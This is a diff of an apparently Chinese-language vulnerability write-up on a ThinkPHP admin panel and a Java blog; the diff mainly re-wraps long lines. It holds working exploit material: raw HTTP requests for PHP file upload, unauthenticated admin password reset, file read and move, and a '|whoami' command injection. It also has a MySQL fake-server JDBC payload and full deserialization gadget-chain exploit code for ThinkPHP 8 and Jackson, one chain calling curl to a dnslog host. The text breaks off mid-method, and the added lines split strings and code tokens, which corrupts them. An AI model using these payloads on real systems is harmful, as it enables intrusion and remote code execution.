@@ -59,7 +59,8 @@ serverappadminapicontrollerUploadController.php中有一个file()方法
 
 可以上传任意文件
 
-POST /adminapi/upload/file HTTP/1.1Host: 192.168.2.27:8091token: c44e3426e73f3f7c1a7562ce1cacb962Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gWContent-Length: 198------WebKitFormBoundary7MA4YWxkTrZu0gWContent-Disposition: form-data; name="file"; filename="123.php"Content-Type: image/png<?php phpinfo();?>------WebKitFormBoundary7MA4YWxkTrZu0gW--
+POST /adminapi/upload/file HTTP/1.1Host: 192.168.2.27:
+8091token: c44e3426e73f3f7c1a7562ce1cacb962Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gWContent-Length: 198------WebKitFormBoundary7MA4YWxkTrZu0gWContent-Disposition: form-data; name="file"; filename="123.php"Content-Type: image/png<?php phpinfo();?>------WebKitFormBoundary7MA4YWxkTrZu0gW--
 
 漏洞点3
 
@@ -71,7 +72,12 @@ POST /adminapi/upload/file HTTP/1.1Host: 192.168.2.27:8091token: c44e3426e73f3f7
 
 可未授权重置管理员密码
 
-POST /adminapi/auth.admin/edit HTTP/1.1Host: 127.0.0.1:2998Content-Length: 247sec-ch-ua:version: 1.9.4sec-ch-ua-mobile: ?0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36Content-Type: application/json;charset=UTF-8Accept: application/json, text/plain, */*sec-ch-ua-platform:""Origin: http://127.0.0.1:2998Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: http://127.0.0.1:2998/admin/permission/adminAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: http304ok=1; thinkphp_show_page_trace=0|0Connection: close{"id":1,"account":"admin","name":"admin","dept_id":[1],"jobs_id":[],"role_id":[],"avatar":"http://127.0.0.1:2998/resource/image/adminapi/default/avatar.png","password":"admin1","password_confirm":"admin1","disable":0,"multipoint_login":1,"root":1}
+POST /adminapi/auth.admin/edit HTTP/1.1Host: 127.0.0.1:
+2998Content-Length: 247sec-ch-ua:
+version: 1.9.4sec-ch-ua-mobile: ?0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36Content-Type: application/json;charset=UTF-8Accept: application/json, text/plain, */*sec-ch-ua-platform:""Origin: http://127.0.0.1:
+2998Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: http://127.0.0.1:
+2998/admin/permission/adminAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: http304ok=1; thinkphp_show_page_trace=0|0Connection: close{"id":1,"account":"admin","name":"admin","dept_id":[1],"jobs_id":[],"role_id":[],"avatar":"http://127.0.0.1:
+2998/resource/image/adminapi/default/avatar.png","password":"admin1","password_confirm":"admin1","disable":0,"multipoint_login":1,"root":1}
 
 即使不用token依旧能操作管理员账号
 
@@ -85,7 +91,8 @@ read()方法的file参数在readfile里面
 
 存在任意文件读取
 
-POST /adminapi/file/readHTTP/1.1Host: 127.0.0.1:2998Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: thinkphp_show_page_trace=0|0Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 17file=E:\test.txt
+POST /adminapi/file/readHTTP/1.1Host: 127.0.0.1:
+2998Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: thinkphp_show_page_trace=0|0Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 17file=E:\test.txt
 
 漏洞点5
 
@@ -123,7 +130,72 @@ class ResourceRegister{ /** * 资源路由 * @var Resource */ protected$resource
 
 Validate类部分代码
 
-class Validate{ /** * 自定义验证类型 * @var array */ protected$type= []; /** * 验证类型别名 * @var array */ protected$alias= [ '>'=>'gt','>='=>'egt','<'=>'lt','<='=>'elt','='=>'eq','same'=>'eq', ]; /** * 当前验证规则 * @var array */ protected$rule= []; /** * 验证提示信息 * @var array */ protected$message= []; /** * 验证字段描述 * @var array */ protected$field= []; /** * 默认规则提示 * @var array */ protected$typeMsg= [ 'require' =>':attribute require', 'must' =>':attribute must', 'number' =>':attribute must be numeric', 'integer' =>':attribute must be integer', 'float' =>':attribute must be float', 'string' =>':attribute must be string', 'boolean' =>':attribute must be bool', 'email' =>':attribute not a valid email address', 'mobile' =>':attribute not a valid mobile', 'array' =>':attribute must be a array', 'accepted' =>':attribute must be yes,on or 1', 'date' =>':attribute not a valid datetime', 'file' =>':attribute not a valid file', 'image' =>':attribute not a valid image', 'alpha' =>':attribute must be alpha', 'alphaNum' =>':attribute must be alpha-numeric', 'alphaDash' =>':attribute must be alpha-numeric, dash, underscore', 'activeUrl' =>':attribute not a valid domain or ip', 'chs' =>':attribute must be chinese', 'chsAlpha' =>':attribute must be chinese or alpha', 'chsAlphaNum'=>':attribute must be chinese,alpha-numeric', 'chsDash' =>':attribute must be chinese,alpha-numeric,underscore, dash', 'url' =>':attribute not a valid url', 'ip' =>':attribute not a valid ip', 'dateFormat' =>':attribute must be dateFormat of :rule', 'in' =>':attribute must be in :rule', 'notIn' =>':attribute be notin :rule', 'between' =>':attribute must between :1 - :2', 'notBetween' =>':attribute not between :1 - :2', 'length' =>'size of :attribute must be :rule', 'max' =>'max size of :attribute must be :rule', 'min' =>'min size of :attribute must be :rule', 'after' =>':attribute cannot be less than :rule', 'before' =>':attribute cannot exceed :rule', 'expire' =>':attribute not within :rule', 'allowIp' =>'access IP is not allowed', 'denyIp' =>'access IP denied', 'confirm' =>':attribute out of accord with :2', 'different' =>':attribute cannot be same with :2', 'egt' =>':attribute must greater than or equal :rule', 'gt' =>':attribute must greater than :rule', 'elt' =>':attribute must less than or equal :rule', 'lt' =>':attribute must less than :rule', 'eq' =>':attribute must equal :rule', 'unique' =>':attribute has exists', 'regex' =>':attribute not conform to the rules', 'method' =>'invalid Request method', 'token' =>'invalid token', 'fileSize' =>'filesize not match', 'fileExt' =>'extensions to upload is not allowed', 'fileMime' =>'mimetype to upload is not allowed', 'startWith' =>':attribute must start with :rule', 'endWith' =>':attribute must end with :rule', 'contain' =>':attribute must contain :rule', ]; /** * 当前验证场景 * @var string */ protected$currentScene; /** * 内置正则验证规则 * @var array */ protected$defaultRegex= [ 'alpha' =>'/^[A-Za-z]+$/', 'alphaNum' =>'/^[A-Za-z0-9]+$/', 'alphaDash' =>'/^[A-Za-z0-9-_]+$/', 'chs' =>'/^[p{Han}]+$/u', 'chsAlpha' =>'/^[p{Han}a-zA-Z]+$/u', 'chsAlphaNum'=>'/^[p{Han}a-zA-Z0-9]+$/u', 'chsDash' =>'/^[p{Han}a-zA-Z0-9_-]+$/u', 'mobile' =>'/^1[3-9]d{9}$/', 'idCard' =>'/(^[1-9]d{5}(18|19|([23]d))d{2}((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)d{3}[0-9Xx]$)|(^[1-9]d{5}d{2}((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)d{3}$)/', 'zip' =>'/d{6}/', ]; /** * Filter_var 规则 * @var array */ protected$filter= [ 'email' => FILTER_VALIDATE_EMAIL, 'ip' => [FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_IPV6], 'integer'=> FILTER_VALIDATE_INT, 'url' => FILTER_VALIDATE_URL, 'macAddr'=> FILTER_VALIDATE_MAC, 'float' => FILTER_VALIDATE_FLOAT, ]; /** * 验证场景定义 * @var array */ protected$scene= [];因此可以劫持hidden映射给systemclass Validate { protected$type= ["hidden"=>"system"];}
+class Validate{ /** * 自定义验证类型 * @var array */ protected$type= []; /** * 验证类型别名 * @var array */ protected$alias= [ '>'=>'gt','>='=>'egt','<'=>'lt','<='=>'elt','='=>'eq','same'=>'eq', ]; /** * 当前验证规则 * @var array */ protected$rule= []; /** * 验证提示信息 * @var array */ protected$message= []; /** * 验证字段描述 * @var array */ protected$field= []; /** * 默认规则提示 * @var array */ protected$typeMsg= [ 'require' =>':
+attribute require', 'must' =>':
+attribute must', 'number' =>':
+attribute must be numeric', 'integer' =>':
+attribute must be integer', 'float' =>':
+attribute must be float', 'string' =>':
+attribute must be string', 'boolean' =>':
+attribute must be bool', 'email' =>':
+attribute not a valid email address', 'mobile' =>':
+attribute not a valid mobile', 'array' =>':
+attribute must be a array', 'accepted' =>':
+attribute must be yes,on or 1', 'date' =>':
+attribute not a valid datetime', 'file' =>':
+attribute not a valid file', 'image' =>':
+attribute not a valid image', 'alpha' =>':
+attribute must be alpha', 'alphaNum' =>':
+attribute must be alpha-numeric', 'alphaDash' =>':
+attribute must be alpha-numeric, dash, underscore', 'activeUrl' =>':
+attribute not a valid domain or ip', 'chs' =>':
+attribute must be chinese', 'chsAlpha' =>':
+attribute must be chinese or alpha', 'chsAlphaNum'=>':
+attribute must be chinese,alpha-numeric', 'chsDash' =>':
+attribute must be chinese,alpha-numeric,underscore, dash', 'url' =>':
+attribute not a valid url', 'ip' =>':
+attribute not a valid ip', 'dateFormat' =>':
+attribute must be dateFormat of :
+rule', 'in' =>':
+attribute must be in :
+rule', 'notIn' =>':
+attribute be notin :
+rule', 'between' =>':
+attribute must between :1 - :2', 'notBetween' =>':
+attribute not between :1 - :2', 'length' =>'size of :
+attribute must be :
+rule', 'max' =>'max size of :
+attribute must be :
+rule', 'min' =>'min size of :
+attribute must be :
+rule', 'after' =>':
+attribute cannot be less than :
+rule', 'before' =>':
+attribute cannot exceed :
+rule', 'expire' =>':
+attribute not within :
+rule', 'allowIp' =>'access IP is not allowed', 'denyIp' =>'access IP denied', 'confirm' =>':
+attribute out of accord with :2', 'different' =>':
+attribute cannot be same with :2', 'egt' =>':
+attribute must greater than or equal :
+rule', 'gt' =>':
+attribute must greater than :
+rule', 'elt' =>':
+attribute must less than or equal :
+rule', 'lt' =>':
+attribute must less than :
+rule', 'eq' =>':
+attribute must equal :
+rule', 'unique' =>':
+attribute has exists', 'regex' =>':
+attribute not conform to the rules', 'method' =>'invalid Request method', 'token' =>'invalid token', 'fileSize' =>'filesize not match', 'fileExt' =>'extensions to upload is not allowed', 'fileMime' =>'mimetype to upload is not allowed', 'startWith' =>':
+attribute must start with :
+rule', 'endWith' =>':
+attribute must end with :
+rule', 'contain' =>':
+attribute must contain :
+rule', ]; /** * 当前验证场景 * @var string */ protected$currentScene; /** * 内置正则验证规则 * @var array */ protected$defaultRegex= [ 'alpha' =>'/^[A-Za-z]+$/', 'alphaNum' =>'/^[A-Za-z0-9]+$/', 'alphaDash' =>'/^[A-Za-z0-9-_]+$/', 'chs' =>'/^[p{Han}]+$/u', 'chsAlpha' =>'/^[p{Han}a-zA-Z]+$/u', 'chsAlphaNum'=>'/^[p{Han}a-zA-Z0-9]+$/u', 'chsDash' =>'/^[p{Han}a-zA-Z0-9_-]+$/u', 'mobile' =>'/^1[3-9]d{9}$/', 'idCard' =>'/(^[1-9]d{5}(18|19|([23]d))d{2}((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)d{3}[0-9Xx]$)|(^[1-9]d{5}d{2}((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)d{3}$)/', 'zip' =>'/d{6}/', ]; /** * Filter_var 规则 * @var array */ protected$filter= [ 'email' => FILTER_VALIDATE_EMAIL, 'ip' => [FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_IPV6], 'integer'=> FILTER_VALIDATE_INT, 'url' => FILTER_VALIDATE_URL, 'macAddr'=> FILTER_VALIDATE_MAC, 'float' => FILTER_VALIDATE_FLOAT, ]; /** * 验证场景定义 * @var array */ protected$scene= [];因此可以劫持hidden映射给system
+class Validate { protected$type= ["hidden"=>"system"];}
 
 命令执行利用Symfony组件，继承Stub确保在序列化中保留完整结构
 
@@ -131,7 +203,8 @@ namespace SymfonyComponentVarDumperCaster;class ConstStub extends Stub { public$
 
 pop链
 
-<?php// +----------------------------------------------------------------------+// | ThinkPHP 8 反序列化POP链利用代码// | 利用入口: /api/login/get_account (Cookie: account=...)// +----------------------------------------------------------------------+// ===== 第一阶段：Symfony VarDumper组件（命令存储） =====namespace SymfonyComponentVarDumperCloner { class Stub { public$value='curl kd35jg.dnslog.cn'; public$type= 5; }}namespace SymfonyComponentVarDumperCaster { use SymfonyComponentVarDumperClonerStub; class ConstStub extends Stub {} // 继承Stub以传递命令}// ===== 第二阶段：ThinkPHP验证器（函数劫持） =====namespace think { use SymfonyComponentVarDumperCasterConstStub; class Validate { protected$type= []; // 关键：验证类型映射表 publicfunction__construct() { // 将"hidden"验证类型劫持到system函数 $this->type= ["hidden"=>"system"]; } } abstract class Model { protected$append= []; // 触发属性追加 protected$relation= []; // 绑定验证器 protected$hidden= []; // 存储命令对象 publicfunction__construct() { // 构造三角关系：append -> hidden -> relation $this->hidden = ["pwn"=> new ConstStub()]; //"pwn"是触发属性名 $this->append = ["pwn"=> []]; // 触发对"pwn"属性的访问 $this->relation = ["pwn"=> new Validate()]; // 访问时调用Validate验证器 } }}// ===== 第三阶段：ThinkPHP模型（触发载体） =====namespace thinkmodel { use thinkModel; class Pivot extends Model {} // 具体模型类，继承Model的触发逻辑}// ===== 第四阶段：ThinkPHP路由（入口包装） =====namespace thinkroute { use thinkmodelPivot; abstract class Rule { protected$rule="1.2"; protected$option= []; // 路由参数，存放Pivot对象 publicfunction__construct() { // 将Pivot对象埋入路由参数中 $this->option = ["var"=> ["1"=> new Pivot()]]; } } class RuleGroup extends Rule { publicfunction__construct() { parent::__construct(); } } class Resource extends RuleGroup {} // 具体路由规则类 class ResourceRegister { protected$resource; // 启动链的入口属性 publicfunction__construct() { $this->resource = new Resource(); // 包装Resource对象 } }}namespace { $entry= new thinkrouteResourceRegister(); $payload= base64_encode(serialize($entry)); echo"生成的Payload:n"; echo$payload."nn"; echo"利用方式:n"; echo"GET /api/login/get_account HTTP/1.1n"; echo"Host: target.comn"; echo"Cookie: account=".$payload."n";}
+<?php// +----------------------------------------------------------------------+// | ThinkPHP 8 反序列化POP链利用代码// | 利用入口: /api/login/get_account (Cookie: account=...)// +----------------------------------------------------------------------+// ===== 第一阶段：Symfony VarDumper组件（命令存储） =====namespace SymfonyComponentVarDumperCloner { class Stub { public$value='curl kd35jg.dnslog.cn'; public$type= 5; }}namespace SymfonyComponentVarDumperCaster { use SymfonyComponentVarDumperClonerStub; class ConstStub extends Stub {} // 继承Stub以传递命令}// ===== 第二阶段：ThinkPHP验证器（函数劫持） =====namespace think { use SymfonyComponentVarDumperCasterConstStub; class Validate { protected$type= []; // 关键：验证类型映射表 publicfunction__construct() { // 将"hidden"验证类型劫持到system函数 $this->type= ["hidden"=>"system"]; } } abstract class Model { protected$append= []; // 触发属性追加 protected$relation= []; // 绑定验证器 protected$hidden= []; // 存储命令对象 publicfunction__construct() { // 构造三角关系：append -> hidden -> relation $this->hidden = ["pwn"=> new ConstStub()]; //"pwn"是触发属性名 $this->append = ["pwn"=> []]; // 触发对"pwn"属性的访问 $this->relation = ["pwn"=> new Validate()]; // 访问时调用Validate验证器 } }}// ===== 第三阶段：ThinkPHP模型（触发载体） =====namespace thinkmodel { use thinkModel; class Pivot extends Model {} // 具体模型类，继承Model的触发逻辑}// ===== 第四阶段：ThinkPHP路由（入口包装） =====namespace thinkroute { use thinkmodelPivot; abstract class Rule { protected$rule="1.2"; protected$option= []; // 路由参数，存放Pivot对象 publicfunction__construct() { // 将Pivot对象埋入路由参数中 $this->option = ["var"=> ["1"=> new Pivot()]]; } } class RuleGroup extends Rule { publicfunction__construct() { parent::
+__construct(); } } class Resource extends RuleGroup {} // 具体路由规则类 class ResourceRegister { protected$resource; // 启动链的入口属性 publicfunction__construct() { $this->resource = new Resource(); // 包装Resource对象 } }}namespace { $entry= new thinkrouteResourceRegister(); $payload= base64_encode(serialize($entry)); echo"生成的Payload:n"; echo$payload."nn"; echo"利用方式:n"; echo"GET /api/login/get_account HTTP/1.1n"; echo"Host: target.comn"; echo"Cookie: account=".$payload."n";}
 
 【java】
 
@@ -145,7 +218,9 @@ pop链
 
 可以移动文件到指定目录并且选择是否覆盖
 
-GET /init/template?file=C:/Users/attac/Downloads/192.168.20.128/202511190920/1.txt&target=C:/Users/attac/Downloads/192.168.20.128/202511190920/static/ HTTP/1.1Host: localhost:8080sec-ch-ua:sec-ch-ua-mobile: ?0sec-ch-ua-platform:""Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close
+GET /init/template?file=C:/Users/attac/Downloads/192.168.20.128/202511190920/1.txt&target=C:/Users/attac/Downloads/192.168.20.128/202511190920/static/ HTTP/1.1Host: localhost:
+8080sec-ch-ua:
+sec-ch-ua-mobile: ?0sec-ch-ua-platform:""Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close
 
 命令执行
 
@@ -153,7 +228,9 @@ GET /init/template?file=C:/Users/attac/Downloads/192.168.20.128/202511190920/1.t
 
 并且直接根据当前系统将path拼接到命令中，可以使用逻辑运算符来截断
 
-POST /blog/api/filelist HTTP/1.1Host: localhost:8080sec-ch-ua:sec-ch-ua-mobile: ?0sec-ch-ua-platform:""Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 12path=|whoami
+POST /blog/api/filelist HTTP/1.1Host: localhost:
+8080sec-ch-ua:
+sec-ch-ua-mobile: ?0sec-ch-ua-platform:""Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 12path=|whoami
 
 jdbc连接mysql fake server读文件
 
@@ -167,7 +244,10 @@ http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/https://www.ves
 
 结合DatabaseVo.class构造jdbc连接mysql的payload
 
-POST /database/testConnection HTTP/1.1Host: localhost:8080Content-Type: application/jsonContent-Length: 235{"dbDriver":"com.mysql.cj.jdbc.Driver","dbUrl":"jdbc:mysql://{服务器ip}:3306/fake_db?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/","dbUsername":"caonima","dbPassword":"hack"}
+POST /database/testConnection HTTP/1.1Host: localhost:
+8080Content-Type: application/jsonContent-Length: 235{"dbDriver":"com.mysql.cj.jdbc.Driver","dbUrl":"jdbc:
+mysql://{服务器ip}:
+3306/fake_db?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/","dbUsername":"caonima","dbPassword":"hack"}
 
 反序列化
 
@@ -181,7 +261,21 @@ POST /database/testConnection HTTP/1.1Host: localhost:8080Content-Type: applicat
 
 发现直接将data传递给commentService.deserialize(data)，继续跟进commentService
 
-//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//package com.puboot.module.admin.service.impl;import com.baomidou.mybatisplus.core.metadata.IPage;import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;import com.puboot.common.util.Pagination;import com.puboot.module.admin.mapper.BizCommentMapper;import com.puboot.module.admin.model.BizComment;import com.puboot.module.admin.service.BizCommentService;import com.puboot.module.admin.vo.CommentConditionVo;import java.io.ByteArrayInputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectStreamClass;import java.util.Base64;import java.util.HashMap;import org.springframework.stereotype.Service;@Servicepublic class BizCommentServiceImpl extends ServiceImpl<BizCommentMapper, BizComment> implements BizCommentService { private final BizCommentMapper commentMapper; public IPage<BizComment> selectComments(CommentConditionVo vo, Integer pageNumber, Integer pageSize) { IPage<BizComment> page = new Pagination((long)pageNumber, (long)pageSize); page.setRecords(this.commentMapper.selectComments(page, vo)); returnpage; } public int deleteBatch(Integer[] ids) { returnthis.commentMapper.deleteBatch(ids); } public Object deserialize(String data) throws IOException { if(data == null) { throw new IOException("data is null"); }else{ byte[] decode; try { decode = Base64.getDecoder().decode(data); } catch (IllegalArgumentException var36) { IllegalArgumentException e = var36; throw new IOException("Base64 decode failed", e); } ByteArrayInputStream bais = new ByteArrayInputStream(decode); Throwable var4 = null; Object e; try { ObjectInputStream ois = new ObjectInputStream(bais) { boolean check =false; protected Class resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { Class<?> targetc = super.resolveClass(desc); if(!this.check && !HashMap.class.isAssignableFrom(targetc)) { throw new IllegalArgumentException("HackerClass:"+ targetc); }else{ this.check =true; returntargetc; } } }; Throwable var6 = null; try { try { e = ois.readObject(); } catch (ClassNotFoundException var34) { e = var34; throw new RuntimeException((Throwable)e); } } catch (Throwable var35) { e = var35; var6 = var35; throw var35; } finally { if(ois != null) { if(var6 != null) { try { ois.close(); } catch (Throwable var33) { var6.addSuppressed(var33); } }else{ ois.close(); } } } } catch (Throwable var38) { var4 = var38; throw var38; } finally { if(bais != null) { if(var4 != null) { try { bais.close(); } catch (Throwable var32) { var4.addSuppressed(var32); } }else{ bais.close(); } } } returne; } } public BizCommentServiceImpl(final BizCommentMapper commentMapper) { this.commentMapper = commentMapper; }}
+//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//package com.puboot.module.admin.service.impl;
+import com.baomidou.mybatisplus.core.metadata.IPage;
+import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;
+import com.puboot.common.util.Pagination;
+import com.puboot.module.admin.mapper.BizCommentMapper;
+import com.puboot.module.admin.model.BizComment;
+import com.puboot.module.admin.service.BizCommentService;
+import com.puboot.module.admin.vo.CommentConditionVo;
+import java.io.ByteArrayInputStream;
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.ObjectStreamClass;
+import java.util.Base64;
+import java.util.HashMap;
+import org.springframework.stereotype.Service;@Servicepublic class BizCommentServiceImpl extends ServiceImpl implements BizCommentService { private final BizCommentMapper commentMapper; public IPage selectComments(CommentConditionVo vo, Integer pageNumber, Integer pageSize) { IPage page = new Pagination((long)pageNumber, (long)pageSize); page.setRecords(this.commentMapper.selectComments(page, vo)); returnpage; } public int deleteBatch(Integer[] ids) { returnthis.commentMapper.deleteBatch(ids); } public Object deserialize(String data) throws IOException { if(data == null) { throw new IOException("data is null"); }else{ byte[] decode; try { decode = Base64.getDecoder().decode(data); } catch (IllegalArgumentException var36) { IllegalArgumentException e = var36; throw new IOException("Base64 decode failed", e); } ByteArrayInputStream bais = new ByteArrayInputStream(decode); Throwable var4 = null; Object e; try { ObjectInputStream ois = new ObjectInputStream(bais) { boolean check =false; protected Class resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { Class<?> targetc = super.resolveClass(desc); if(!this.check && !HashMap.class.isAssignableFrom(targetc)) { throw new IllegalArgumentException("HackerClass:"+ targetc); }else{ this.check =true; returntargetc; } } }; Throwable var6 = null; try { try { e = ois.readObject(); } catch (ClassNotFoundException var34) { e = var34; throw new RuntimeException((Throwable)e); } } catch (Throwable var35) { e = var35; var6 = var35; throw var35; } finally { if(ois != null) { if(var6 != null) { try { ois.close(); } catch (Throwable var33) { var6.addSuppressed(var33); } }else{ ois.close(); } } } } catch (Throwable var38) { var4 = var38; throw var38; } finally { if(bais != null) { if(var4 != null) { try { bais.close(); } catch (Throwable var32) { var4.addSuppressed(var32); } }else{ bais.close(); } } } returne; } } public BizCommentServiceImpl(final BizCommentMapper commentMapper) { this.commentMapper = commentMapper; }}
 
 其中deserialize方法的ObjectInputStream是一个沙箱，只允许 HashMap 及其子类作为第一个反序列化的类
 
@@ -211,11 +305,44 @@ https://github.com/FasterXML/jackson-databind/issues/2986https://zhuanlan.zhihu.
 
 完整利用链
 
-HashMap::readObject() ↓HashMap::putVal() ↓ HashMap::hash() ↓ObjectIdGenerator$IdKey::hashCode() ↓POJONode::hashCode() ↓ POJONode::toString() ↓POJONode::serialize() ↓BeanSerializer::serialize() ↓BeanSerializer::serializeFields() ↓BeanPropertyWriter::serializeAsField() ↓MethodProperty::get() ↓TemplatesImpl::getOutputProperties() ↓TemplatesImpl::newTransformer() ↓TemplatesImpl::getTransletInstance() ↓TransletClassLoader::defineClass() ↓恶意类::<clinit>() ↓Runtime::exec()
+HashMap::
+readObject() ↓HashMap::
+putVal() ↓ HashMap::
+hash() ↓ObjectIdGenerator$IdKey::
+hashCode() ↓POJONode::
+hashCode() ↓ POJONode::
+toString() ↓POJONode::
+serialize() ↓BeanSerializer::
+serialize() ↓BeanSerializer::
+serializeFields() ↓BeanPropertyWriter::
+serializeAsField() ↓MethodProperty::
+get() ↓TemplatesImpl::
+getOutputProperties() ↓TemplatesImpl::
+newTransformer() ↓TemplatesImpl::
+getTransletInstance() ↓TransletClassLoader::
+defineClass() ↓恶意类::<clinit>() ↓Runtime::
+exec()
 
 payload
 
-import com.fasterxml.jackson.annotation.ObjectIdGenerator;import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.org.apache.xpath.internal.objects.XString;import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.URLEncoder;import java.util.Base64;import java.util.HashMap;public class exp { public static void main(String[] args) throws Exception { CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode"); CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace"); ctClass.removeMethod(writeReplace); ctClass.toClass(); TemplatesImpl tmp = new TemplatesImpl(); setValue(tmp,"_tfactory", new TransformerFactoryImpl()); setValue(tmp,"_name","Phantom"); setValue(tmp,"_bytecodes", generateEvilBytes()); POJONode pojoNode = new POJONode(tmp); ObjectIdGenerator.IdKey idkey1 = new ObjectIdGenerator.IdKey(Object.class, Object.class, new XString("")); ObjectIdGenerator.IdKey idkey2 = new ObjectIdGenerator.IdKey(Object.class, Object.class, pojoNode); setFieldValue(idkey1,"hashCode", 0); setFieldValue(idkey2,"hashCode", 2); HashMap<Object, Object> hashMap = new HashMap<Object, Object>(); hashMap.put(idkey1,"x"); hashMap.put(idkey2,"a"); setFieldValue(idkey2,"hashCode", 0); byte[] serializedData = serialize(hashMap); String base64Payload = Base64.getEncoder().encodeToString(serializedData); String urlEncodedPayload = URLEncoder.encode(base64Payload,"UTF-8"); System.out.println("Base64 Payload:"); System.out.println(base64Payload); System.out.println("nURL Encoded Payload:"); System.out.println(urlEncodedPayload); // unserialize(serializedData); } public static byte[] serialize(Object obj) throws Exception { ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream objo = new ObjectOutputStream(baos); objo.writeObject(obj); objo.close(); returnbaos.toByteArray(); } public static void unserialize(byte[] string) throws Exception { ByteArrayInputStream bais = new ByteArrayInputStream(string); ObjectInputStream obji = new ObjectInputStream(bais); obji.readObject(); obji.close(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static byte[][] generateEvilBytes() throws Exception { 